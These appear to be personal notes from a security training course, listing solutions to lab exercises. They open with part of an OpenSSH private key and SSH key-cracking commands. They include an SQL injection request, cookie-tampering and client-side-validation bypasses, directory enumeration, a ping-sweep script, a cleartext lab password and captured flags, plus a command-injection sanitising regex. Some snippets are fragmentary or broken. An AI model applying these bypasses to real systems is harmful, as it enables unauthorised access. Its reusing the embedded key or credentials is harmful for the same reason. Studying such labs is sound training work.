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
-----END OPENSSH PRIVATE KEY-----
```shell
ssh2john id_rsa > ssh.hash


ssh -i ~/.ssh/custom_key_name SYSUSER@x.x.x.x



try downloading key locally and connecting using ssh
ssh -p 2222 USERNAME@192.168.195.115 -o "UserKnownHostsFile=/dev/null" -o "StrictHostKeyChecking=no" -i ./customkey



```





# During an assessment of this web server, we have found the password to the web administrator user to be webadmin. However, it seems that the web administrator user is disabled when we try to use the credentials to log in. Find a way to bypass the server's account disabling measure, and log in as the web administrator to get the flag.
rubenmurphy
```
# delete onsubmit javascript function code
OS{4e2e289c48a83d1ca3a51f6c68c6b314}

```



# secure sql login
After securing their file upload server, the web administrator wants your help in securing their login. SSH into the instance, and modify the /var/www/html/login.php file to secure the webserver.
Once you have finished securing the webserver, run ./check_solution in your home directory /home/student/ to get the flag.
There is a CHALLENGE_README located in /home/student/CHALLENGE_README, which contains more detailed instructions on how to secure the webserver.
```
C:\dev\git\bravo\offsec\web100\attempt1\login.php 
```






# sql injection 
During an application assessment, we have discovered a web server that lists out employee information. Find a way to get the web server to dump every single employee in the database to get the flag.
```sh

gobuster dir -u http://192.168.207.118 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt

GET /team/?uid=1%20OR%201%3d1 HTTP/1.1
```



# Auth Bypass 2
After the previous application assessment uncovered an authentication bypass vulnerability, the web administrator decided to change how the authentication worked. This time, we're still given access to the guest account of the website, with a username of "guest" and a password of "guest".

Find another way to escalate privileges to the web administrator's account to get the flag.

The web service is available on your instance on port 80.
```sh
COOKIE AUTH
GET /home/ HTTP/1.1
Host: 192.168.207.118
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://192.168.207.118/login/
Connection: close
Cookie: usrauth=annerobinson
Upgrade-Insecure-Requests: 1





```

# Broken Authentication
Exercises
After the testers have bypassed the website's authentication multiple times, the web administrator has finally implemented a secure login authentication that can't be easily bypassed. However, the authentication is now misconfigured so that the web administrator cannot log in, even with the correct password!

Given a password of "webadmin", figure out what the web administrator did incorrectly, and find a way to successfully log in to the web administrator's account to get the flag.

The web service is available on your instance on port 80.

```
aubreecurtis


```


# Command Injection Sanitization
Exercises
In this challenge, your task is to sanitize a command injection string using a regular expression. Navigate to port 80 of your instance for specific instructions of your task.

Once you've solved the challenge, the flag will be printed out on the webpage.

Hint: Recalling how to properly escape certain characters in a string may prove very useful.

## PAGE 
Command Injection Sanitization

Your task is to sanitize the following OS command injection technique using a regular expression (regex). This injection example contains two Linux OS commands:

    A benign command date
    A "malicious" command id

The regex you submit will be used to sanitize (strip off) this technique. You will obtain the flag if both of these conditions are met:

    The benign command is executed successfully
    The malicious command is NOT executed

NOTE: Your objective is to sanitize this injection technique, not the execution of the specific OS commands used as example (id and date). The server will use different commands when checking your regex.

Hint: If a special regex character (such as $, |, (, or )) is used as a literal in the object string, it must be properly escaped. Otherwise, the regex parser will raise an exception.

Command Injection Point 		Sanitization Regex
.../pwned.html?cmd=date ;id 		/ / gm


```shell
[;&\|`\$<>].*|%[0-9a-fA-F]{2}

```


# Timestamp Format
Exercises
For this challenge, you're given a file called flag.input that contains data and timestamps. Your task is to implement a python script to filter out invalid timestamps to get the flag.

Further information on what constitutes a valid or invalid timestamp is in the CHALLENGE_README file.
`timestamp-draft.py`

```py
import re

f = open("flag.input", "r")
lines = f.readlines()
f.close()

for i in range(0, len(lines)):
  lines[i] = lines[i][:-1] #Remove trailing newline character

for l in lines:
  pattern = re.compile("") #Implement the correct regular expression to ensure that the timestamp fits the correct syntactic format.
  if pattern.match(l): #If the line matches the pattern
    # Implement your semantic checks here on the remaining timestamps
```
```shell
\d{4}year-[0-5][0-9]minute-TIMESTAMP-(0?[1-9]|1[012])month-(2[0-3]|[01]?[0-9])hour-INPUT-([0-5][0-9])second-([0-3][0-9])day


MMmonth-mmminute-TIMESTAMP-INPUT-sssecond-HHhour-YYYYyear-DDday, Data: c

(0?[1-9]|1[012])month-[0-5][0-9]minute-TIMESTAMP-INPUT-([0-5][0-9])second-(2[0-3]|[01]?[0-9])hour-\d{4}year-([0-3][0-9])day





```



# Serialization Translation
Exercises
For this challenge, your task is to translate an object serialized in one language into another language. All of the object's properties must be translated precisely, according to their intended data type.

Navigate to port 80 of your instance to view specific instructions for the serialization translation challenge.

## Serialization Translation

Your task is to translate the following serialized Pet object from XML to YAML. The Pet object has these internal properties:

    animal: Type of animal (cat, dog, etc)
    breed: Pet's breed
    name: Pet's name
    age: Pet's age
    vaccinations: List of vaccinations received

Hint: pay particularly close attention to data types and translation of the list items...

```xml
<?xml version="1.0" ?>
<Pet>
    <animal type="str">Dog</animal>
    <breed type="str">Shiba Inu</breed>
    <name type="str">Rosie</name>
    <age type="int">11</age>
    <vaccinations type="list">
        <item type="str">VAC-E0DD71</item>
        <item type="str">VAC-DA09D6</item>
        <item type="str">VAC-5C0E34</item>
    </vaccinations>
</Pet>
```
https://www.anyjson.in/xml-to-yaml 


# Yaml Data Management
Exercises
For this challenge, you're given a file called flag.yaml that contains several base64-encoded data entries.

Write a python script to piece together the base64-encoded string. Then, decode the string into a binary file. Finally, grant the binary file executable permissions and run it to obtain the flag.

```sh
#sometimes can be position 2
grep "dataval" flag.yaml | awk '{print $3}' | tr -d "\n" | base64 -d > yamlbin

strings yamlbin

```


OS{2c9d54dd540eb7a79669bda4016a23e8}






# bash loops
#!/bin/bash
n=$2                   #$1
ip=$1                   #$2
IFS='.' read -a ipa <<< $ip
counter=$ipa[3]       #change back to 0
while [ $counter -le $n ]
do
    newip="${ipa[0]}.${ipa[1]}.${ipa[2]}.${counter}"
    p=$(ping -W 1 -c 1 $newip ; echo $?)
        if ping -c 1 $newip &> /dev/null
        then
          p=1   #doesnt exist
        else
          p=0   #exists
        fi

    
    #echo $p
    if [ "$newip" != "$ip" ] && [ $counter -lt 255 ] && [ $p == 0 ] ;
    then
        echo $newip
    fi
    ((counter++))  
done













#!/bin/bash
n=$2                   #$1
ip=$1                   #$2
ipa=$(echo "$ip" | cut -d. -f1-4)
counter=$ipa[3]

while [ $counter -le $n ]
do
    newip="${ipa[0]}.${ipa[1]}.${ipa[2]}.${counter}"
    #echo $p
    if [ "$newip" != "$ip" ] && [ $counter -lt 255 ];
    then
        echo $newip
    fi
    ((counter++))  
done



# compile c
```sh
└─$ gcc ./student_solution.c -lcurl -o walkthrough
./student_solution.c: In function ‘WriteMemoryCallback’:
./student_solution.c:15:38: error: conversion to non-scalar type requested
   15 |   struct MemoryStruct *mem = (struct MemoryStruct)userp;
      |                                      ^~~~~~~~~~~~
./student_solution.c:19:58: error: expected ‘;’ before ‘return’
   19 |     printf("not enough memory (realloc returned NULL)\n")
      |                                                          ^
      |                                                          ;
   20 |     return 0;
      |     ~~~~~~                                                
./student_solution.c: In function ‘main’:
./student_solution.c:32:3: error: unknown type name ‘CURLCode’; did you mean ‘CURLcode’?
   32 |   CURLCode res;
      |   ^~~~~~~~
      |   CURLcode



1.  line 15 replace  = (struct MemoryStruct)userp; with  = (struct MemoryStruct*)userp;
2.  line 19 append ;
3.  line 32 CURLcode res;


gcc ./student_solution.c -lcurl -o solution
chmod +x ./solution
./solution








#basic authentication 
curl -v -u "student:PCWgWJMMZwzMNV2s" http://webservices/exercise/

curl -X GET -H "Origin: https://example.com" -H "X-Flag: some-value" http://sop-cors-sandbox/exercise



mkdir dir1 dir2 dir3 && \
echo "text" > dir1/file1 && \
echo "text" > dir2/file2 && \
echo "text" > dir3/file3

git config --local user.email "challenge1@local" && git config --local user.name "challenge1"

git branch -r

```


# splunk

source=*




# github
offsec@git:~/branching$ git branch -r
  origin/HEAD -> origin/main
  origin/electronics
  origin/furniture
  origin/main
  origin/office


start a new repository
    - git init
clone an existing repo
    - git clone
get the status 
    - git status


switch to main branch if not
    - git checkout main

